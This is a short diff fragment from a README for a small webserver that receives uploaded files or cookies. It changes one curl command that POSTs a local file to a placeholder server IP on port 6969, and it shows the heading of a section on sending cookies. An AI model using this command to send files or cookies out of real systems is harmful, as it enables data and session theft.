@@ -24,7 +24,7 @@ A simple webserver you can send files or cookies to. I wrote it specifically for
 **POST**
 
 ```bash=
-curl -X POST --form "data=@/path/to/file" http://<server-ip>:6969
+curl -X POST --form "data=@/path/to/file" http://<server-ip>:6969/f
 ```
 
 **Cookies via POST**
